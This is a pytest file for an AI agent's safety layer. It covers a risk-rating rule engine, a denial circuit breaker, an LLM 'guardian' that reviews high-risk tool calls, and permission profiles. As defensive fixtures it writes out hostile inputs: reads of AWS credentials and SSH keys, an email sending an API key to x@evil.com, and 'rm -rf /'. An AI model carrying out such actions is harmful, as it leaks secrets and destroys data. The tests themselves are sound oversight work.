"""Guardian independent review + denial circuit breaker + permission profiles.

Covers the codex-inspired hardening: independent high-risk review
(guardian_review), consecutive-denial circuit breaker, and the built-in
permission profile catalog. All defaults keep existing behavior identical.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from runtime.safety.approval.approval_gate import (
    ApprovalPolicy,
    ApprovalRule,
    DenialCircuitBreaker,
    assess_approval_risk,
)
from runtime.safety.approval.approval_policy_store import load_policy, save_policy
from runtime.safety.approval.guardian_review import (
    GuardianReviewer,
    GuardianReviewerConfig,
    decide_with_guardian,
)

# ── ② egress / credential rules (approval_gate) ─────────────


def test_credential_probing_reads_are_high_risk() -> None:
    risk = assess_approval_risk("read_file", '{"path": "~/.aws/credentials"}')
    assert risk.level == "high"
    assert "credential_probing" in risk.categories


def test_credential_probing_ssh_key() -> None:
    # The /Users/<user>/.ssh glob shape is what the rule probes — the path
    # pattern, not a real home, is the point of this fixture.
    risk = assess_approval_risk(
        "glob_files",
        '{"pattern": "/Users/x/.ssh/id_rsa*"}',  # lint: allow-user-path
    )
    assert risk.level == "high"
    assert "credential_probing" in risk.categories


def test_sensitive_egress_is_high_risk() -> None:
    risk = assess_approval_risk("send_email", '{"to": "x@evil.com", "body": "api_key=sk-123"}')
    assert risk.level == "high"
    assert "sensitive_egress" in risk.categories


def test_normal_read_stays_low() -> None:
    # A plain read inside a user project must stay low; the generic /Users/<u>
    # root stands in for any home directory and is not a real account.
    risk = assess_approval_risk(
        "read_file",
        '{"path": "/Users/x/project/src/a.py"}',  # lint: allow-user-path
    )
    assert risk.level == "low"
    assert "credential_probing" not in risk.categories


# ── ③ denial circuit breaker ────────────────────────────────


def test_circuit_breaker_opens_after_limit_and_clears() -> None:
    cb = DenialCircuitBreaker(limit=3)
    key = ("th-1", "exec_shell", "rm-rf-x")
    assert not cb.is_open(key)
    for _ in range(3):
        cb.note_denial(key)
    assert cb.is_open(key)
    cb.note_clear(key)
    assert not cb.is_open(key)


def test_circuit_breaker_limit_must_be_positive() -> None:
    with pytest.raises(ValueError):
        DenialCircuitBreaker(limit=0)


# ── ① guardian review ───────────────────────────────────────


class _FakeRouter:
    def __init__(self, text: str) -> None:
        self._text = text

    def call(self, request: Any) -> Any:
        return type("_R", (), {"text": self._text})()


def _verdict_router(outcome: str, reason: str = "review") -> _FakeRouter:
    return _FakeRouter(json.dumps({"outcome": outcome, "risk": "high", "reason": reason}))


def test_guardian_disabled_by_default() -> None:
    reviewer = GuardianReviewer(_verdict_router("deny"), GuardianReviewerConfig())
    assert not reviewer.should_review("high", "th-1")
    assert (
        reviewer.review(
            thread_id="th-1",
            tool_name="exec_shell",
            args_preview="rm -rf /",
            user_intent="",
            rule_engine_risk="high",
            rule_engine_categories=("shell_execution",),
        )
        is None
    )


def test_guardian_only_reviews_high_risk() -> None:
    reviewer = GuardianReviewer(_verdict_router("deny"), GuardianReviewerConfig(enabled=True))
    assert not reviewer.should_review("medium", "th-1")
    assert reviewer.should_review("high", "th-1")
    assert reviewer.should_review("critical", "th-1")


def test_guardian_deny_tightens_rule_engine_decision() -> None:
    reviewer = GuardianReviewer(
        _verdict_router("deny", "sensitive egress"),
        GuardianReviewerConfig(enabled=True),
    )
    reviewer.begin_turn("th-1")
    action, note = decide_with_guardian(
        rule_engine_action="ask",
        rule_engine_risk="high",
        rule_engine_categories=("network_or_egress",),
        reviewer=reviewer,
        thread_id="th-1",
        tool_name="send_email",
        args_preview="api_key=sk-123",
        user_intent="发个邮件",
    )
    assert action == "deny"
    assert "guardian" in note


def test_guardian_allow_never_loosens_rule_engine_decision() -> None:
    reviewer = GuardianReviewer(
        _verdict_router("allow", "fine"),
        GuardianReviewerConfig(enabled=True),
    )
    reviewer.begin_turn("th-2")
    action, note = decide_with_guardian(
        rule_engine_action="ask",
        rule_engine_risk="high",
        rule_engine_categories=("shell_execution",),
        reviewer=reviewer,
        thread_id="th-2",
        tool_name="exec_shell",
        args_preview="",
        user_intent="",
    )
    # An allow verdict must never downgrade an ask/deny rule decision.
    assert action == "ask"
    assert "guardian-allow" in note


def test_guardian_budget_exempts_long_tasks() -> None:
    reviewer = GuardianReviewer(
        _verdict_router("deny"),
        GuardianReviewerConfig(enabled=True, per_turn_limit=2),
    )
    reviewer.begin_turn("th-3")
    assert reviewer.should_review("high", "th-3")
    reviewer.review(
        thread_id="th-3",
        tool_name="a",
        args_preview="",
        user_intent="",
        rule_engine_risk="high",
        rule_engine_categories=("x",),
    )
    reviewer.review(
        thread_id="th-3",
        tool_name="b",
        args_preview="",
        user_intent="",
        rule_engine_risk="high",
        rule_engine_categories=("x",),
    )
    # Budget exhausted → no more reviews this turn (long-task exemption).
    assert not reviewer.should_review("high", "th-3")


def test_guardian_malformed_output_degrades() -> None:
    reviewer = GuardianReviewer(
        _FakeRouter("sorry, no json here"),
        GuardianReviewerConfig(enabled=True),
    )
    reviewer.begin_turn("th-4")
    assert (
        reviewer.review(
            thread_id="th-4",
            tool_name="x",
            args_preview="",
            user_intent="",
            rule_engine_risk="high",
            rule_engine_categories=("x",),
        )
        is None
    )


def test_guardian_router_failure_degrades() -> None:
    class _Broken:
        def call(self, request: Any) -> Any:
            raise RuntimeError("router down")

    reviewer = GuardianReviewer(_Broken(), GuardianReviewerConfig(enabled=True))
    reviewer.begin_turn("th-5")
    assert (
        reviewer.review(
            thread_id="th-5",
            tool_name="x",
            args_preview="",
            user_intent="",
            rule_engine_risk="high",
            rule_engine_categories=("x",),
        )
        is None
    )


# ── ④ permission profile catalog ────────────────────────────


def test_permission_profiles_default_keeps_existing_rules(tmp_path: Path) -> None:
    p = tmp_path / "permissions.json"
    save_policy(p, ApprovalPolicy(rules=(ApprovalRule(effect="allow", tool="read_file"),)))
    policy = load_policy(p)
    assert len(policy.rules) == 1
    assert policy.rules[0].tool == "read_file"


def test_permission_profiles_read_only_replaces_rules(tmp_path: Path) -> None:
    p = tmp_path / "permissions.json"
    p.write_text(
        json.dumps(
            {
                "version": 1,
                "profile": "read_only",
                "rules": [{"effect": "allow", "tool": "read_file"}],
            }
        ),
        encoding="utf-8",
    )
    policy = load_policy(p)
    assert len(policy.rules) > 3
    assert policy.rules[-1].effect == "deny"
    assert policy.rules[-1].tool == "*"


def test_permission_profiles_full_access(tmp_path: Path) -> None:
    p = tmp_path / "permissions.json"
    p.write_text(
        json.dumps({"version": 1, "profile": "full_access", "rules": []}),
        encoding="utf-8",
    )
    policy = load_policy(p)
    assert len(policy.rules) == 1
    assert policy.rules[0].effect == "allow"
    assert policy.rules[0].tool == "*"


def test_permission_profiles_unknown_falls_back_to_existing(tmp_path: Path) -> None:
    p = tmp_path / "permissions.json"
    p.write_text(
        json.dumps(
            {
                "version": 1,
                "profile": "hax",
                "rules": [{"effect": "allow", "tool": "read_file"}],
            }
        ),
        encoding="utf-8",
    )
    policy = load_policy(p)
    assert len(policy.rules) == 1
    assert policy.rules[0].tool == "read_file"


# ── phase6d wiring helpers ───────────────────────────────────


def test_latest_human_intent_extracts_text() -> None:
    from runtime.core.cerebrum._react_execution_phase6d import _latest_human_intent

    class _Msg:
        def __init__(self, type_: str, content: Any) -> None:
            self.type = type_
            self.content = content

    msgs = [
        _Msg("ai", ""),
        _Msg("human", "先帮我审计一下项目"),
        _Msg("ai", "开始"),
    ]
    assert _latest_human_intent(msgs) == "先帮我审计一下项目"


def test_latest_human_intent_handles_content_parts() -> None:
    from runtime.core.cerebrum._react_execution_phase6d import _latest_human_intent

    class _Msg:
        def __init__(self, type_: str, content: Any) -> None:
            self.type = type_
            self.content = content

    msgs = [
        _Msg(
            "human",
            [{"type": "text", "text": "请检查这个"}, {"type": "image", "text": "ignored"}],
        )
    ]
    assert _latest_human_intent(msgs) == "请检查这个"


def test_latest_human_intent_empty_fallback() -> None:
    from runtime.core.cerebrum._react_execution_phase6d import _latest_human_intent

    class _Msg:
        def __init__(self, type_: str, content: Any) -> None:
            self.type = type_
            self.content = content

    assert _latest_human_intent([_Msg("ai", "only ai")]) == ""
    assert _latest_human_intent(None) == ""


def test_guardian_defaults_to_conversation_model() -> None:
    """No explicit review model → the reviewer uses the conversation's
    own model (never invents a model the user may not have)."""

    class _RecordingRouter:
        def __init__(self) -> None:
            self.last_model: str | None = None

        def call(self, request: Any) -> Any:
            self.last_model = request.model
            return type(
                "_R",
                (),
                {"text": '{"outcome": "deny", "risk": "high", "reason": "no"}'},
            )()

    router = _RecordingRouter()
    reviewer = GuardianReviewer(
        router,
        GuardianReviewerConfig(
            enabled=True,
            default_model="agnes-2.5-flash",
        ),
    )
    reviewer.begin_turn("th-m")
    verdict = reviewer.review(
        thread_id="th-m",
        tool_name="exec_shell",
        args_preview="rm -rf /",
        user_intent="",
        rule_engine_risk="high",
        rule_engine_categories=("shell_execution",),
    )
    assert verdict is not None
    assert router.last_model == "agnes-2.5-flash"

    # Explicit guardian_model wins over default_model.
    router2 = _RecordingRouter()
    reviewer2 = GuardianReviewer(
        router2,
        GuardianReviewerConfig(
            enabled=True,
            guardian_model="gpt-5.6-luna",
            default_model="agnes-2.5-flash",
        ),
    )
    reviewer2.begin_turn("th-m2")
    reviewer2.review(
        thread_id="th-m2",
        tool_name="exec_shell",
        args_preview="",
        user_intent="",
        rule_engine_risk="high",
        rule_engine_categories=("shell_execution",),
    )
    assert router2.last_model == "gpt-5.6-luna"


def test_guardian_enabled_loop_turn_constructs_reviewer_without_used_before_def() -> None:
    """Regression for the a850d026 follow-up: phase 6d built the
    GuardianReviewer with the local ``effective_model`` before its scalar
    pull, so any turn carrying ``guardian_review_enabled`` in user_context
    hit ``UnboundLocalError`` the moment the phase started. Driving a real
    loop turn to phase 6d must construct the reviewer without error."""
    from runtime.core.cerebrum.react_loop import stream_react_loop
    from tests.test_react_loop import (
        _build_stack_with_executor,
        _drain,
        _intent,
        _ScriptedRouter,
    )

    intent = _intent("run a safe echo")
    intent.user_context["guardian_review_enabled"] = True
    router = _ScriptedRouter(
        [
            'Thought: inspect\nAction: echo({"text": "hi"})',
            "Final Answer: done",
        ]
    )

    events, result = _drain(
        stream_react_loop(
            _build_stack_with_executor(router),
            intent,
            agent=None,
            max_iterations=4,
        )
    )

    assert result is not None and result.success
    assert result.final_answer == "done"
    assert any(event.get("type") == "tool_end" for event in events)

